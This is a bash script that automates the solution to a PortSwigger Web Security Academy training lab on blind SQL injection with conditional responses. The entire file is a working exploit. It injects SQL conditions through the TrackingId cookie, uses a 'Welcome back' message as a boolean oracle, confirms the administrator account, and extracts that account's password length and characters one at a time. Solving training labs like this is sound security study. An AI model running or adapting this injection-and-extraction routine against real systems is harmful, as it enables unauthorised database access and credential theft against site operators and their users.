#!/usr/bin/env bash
set -euo pipefail

# PortSwigger Web Security Academy:
# Blind SQL injection with conditional responses
# Usage: ./portswigger_blind_sqli.sh 'https://LAB-ID.web-security-academy.net' 'SESSION'

if (( $# != 2 )); then
  echo "Usage: $0 <lab-base-url> <session-cookie>" >&2
  exit 1
fi

lab_url="${1%/}"
session_cookie="$2"
cookie_jar="$(mktemp)"
trap 'rm -f "$cookie_jar"' EXIT

# Start a fresh tracking session and read the server-generated TrackingId.
curl --silent --show-error --fail \
  --cookie "session=${session_cookie}" \
  --cookie-jar "$cookie_jar" \
  "$lab_url/" >/dev/null

tracking_id="$(awk '$6 == "TrackingId" { value=$7 } END { print value }' "$cookie_jar")"

if [[ -z "$tracking_id" ]]; then
  echo "Unable to obtain TrackingId. Check the Lab URL and session value." >&2
  exit 1
fi

oracle() {
  local condition="$1"
  local payload response

  # The application supplies the last quote, matching the official Lab syntax.
  payload="${tracking_id}' AND (${condition}) AND '1'='1"

  response="$(curl --silent --show-error --fail \
    --cookie "TrackingId=${payload}; session=${session_cookie}" \
    "$lab_url/")"

  [[ "$response" == *"Welcome back"* ]]
}

echo "[+] TrackingId: $tracking_id"

if ! oracle "1=1"; then
  echo "[-] TRUE test failed: Welcome back was not found." >&2
  exit 1
fi

if oracle "1=2"; then
  echo "[-] FALSE test failed: the response still contained Welcome back." >&2
  exit 1
fi

echo "[+] Boolean oracle confirmed"

if ! oracle "EXISTS(SELECT 1 FROM users WHERE username='administrator')"; then
  echo "[-] users/username/administrator could not be confirmed." >&2
  exit 1
fi

echo "[+] administrator confirmed"

password_length=0
for ((length=1; length<=64; length++)); do
  if oracle "(SELECT LENGTH(password) FROM users WHERE username='administrator')=${length}"; then
    password_length="$length"
    break
  fi
done

if (( password_length == 0 )); then
  echo "[-] Password length was not found in the range 1..64." >&2
  exit 1
fi

echo "[+] Password length: $password_length"

alphabet='abcdefghijklmnopqrstuvwxyz0123456789'
password=''

for ((position=1; position<=password_length; position++)); do
  found=''

  for ((index=0; index<${#alphabet}; index++)); do
    candidate="${alphabet:index:1}"

    if oracle "(SELECT SUBSTRING(password,${position},1) FROM users WHERE username='administrator')='${candidate}'"; then
      password+="$candidate"
      found="$candidate"
      printf '[+] Position %02d: %s   password=%s\n' "$position" "$candidate" "$password"
      break
    fi
  done

  if [[ -z "$found" ]]; then
    echo "[-] No matching character at position $position." >&2
    exit 1
  fi
done

echo "[+] administrator password: $password"
